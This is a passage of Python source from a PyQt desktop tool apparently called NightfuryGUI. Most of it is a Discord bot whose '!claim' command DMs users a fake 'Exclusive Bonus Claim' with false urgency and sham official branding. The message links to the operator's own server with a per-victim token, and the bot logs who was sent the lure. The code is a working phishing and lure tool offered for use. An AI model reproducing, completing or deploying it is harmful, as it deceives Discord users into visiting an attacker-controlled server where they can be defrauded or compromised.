            self.status_bar.showMessage(f"❌ Error: {str(e)}", 5000)
    
    def start_discord_bot(self):
        try:
            self.save_config()
            
            if not self.config['discord_token']:
                raise Exception("Enter Discord token")
            
            # Create and start Discord bot
            intents = discord.Intents.default()
            intents.message_content = True
            intents.members = True
            
            self.discord_bot = commands.Bot(
                command_prefix='!',
                intents=intents
            )
            
            @self.discord_bot.event
            async def on_ready():
                self.bot_status.setText("Bot status: ✅ Connected")
                self.connection_log.append("[+] Discord bot connected")
            
            @self.discord_bot.command()
            async def claim(ctx):
                # Generate a unique claim token
                claim_token = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
                claim_url = f"http://{self.config['domain']}:{self.config['auto_server_port']}/?token={claim_token}"
                
                # Create embed message
                embed = discord.Embed(
                    title="🎁 Exclusive Bonus Claim",
                    description="You've been selected for a special reward!",
                    color=0x00ff00
                )
                embed.add_field(
                    name="Claim Instructions",
                    value=f"Click [here]({claim_url}) to claim your bonus immediately!",
                    inline=False
                )
                embed.add_field(
                    name="Important",
                    value="This offer expires in 10 minutes. Claim now before it's gone!",
                    inline=False
                )
                embed.set_footer(text="Reward Center - Official Distribution")
                
                try:
                    await ctx.author.send(embed=embed)
                    await ctx.send(f"{ctx.author.mention}, check your DMs for your exclusive bonus claim!")
                    self.connection_log.append(f"[+] Sent bonus claim to {ctx.author}")
                except discord.Forbidden:
                    await ctx.send(f"{ctx.author.mention}, I couldn't DM you. Please enable DMs!")
            
            # Start bot in a separate thread
            bot_thread = threading.Thread(target=self.discord_bot.run, args=(self.config['discord_token'],), daemon=True)
            bot_thread.start()
            
            self.start_bot_btn.setEnabled(False)
            self.stop_bot_btn.setEnabled(True)
            self.bot_status.setText("Bot status: ⚡ Starting...")
            
            self.status_bar.showMessage("✅ Discord bot started. Use '!claim' in Discord", 5000)
        except Exception as e:
            self.status_bar.showMessage(f"❌ Bot error: {str(e)}", 5000)
    
    def stop_discord_bot(self):
        try:
            if self.discord_bot:
                asyncio.run(self.discord_bot.close())
                
                self.start_bot_btn.setEnabled(True)
                self.stop_bot_btn.setEnabled(False)
                self.bot_status.setText("Bot status: 🔴 Stopped")
                
                self.connection_log.append("[+] Discord bot stopped")
                self.status_bar.showMessage("✅ Discord bot stopped", 3000)
        except Exception as e:
            self.status_bar.showMessage(f"❌ Error stopping bot: {str(e)}", 5000)
    
    def update_connection_status(self):
        # Update connection count in status bar
        connection_count = len(self.active_connections)
        status = f"✅ System Ready | Connections: {connection_count}"
        if self.http_server and self.http_server.is_running:
            status += " | Server: Running"
        if self.discord_bot:
            status += " | Bot: Running"
        self.status_bar.showMessage(status)

# ==============
# MAIN EXECUTION
# ==============

if __name__ == "__main__":
    app = QApplication(sys.argv)
    app.setStyle("Fusion")
    
    # Set application font
    font = QFont("Consolas", 10)
    app.setFont(font)
    
    window = NightfuryGUI()
    window.show()
    sys.exit(app.exec_())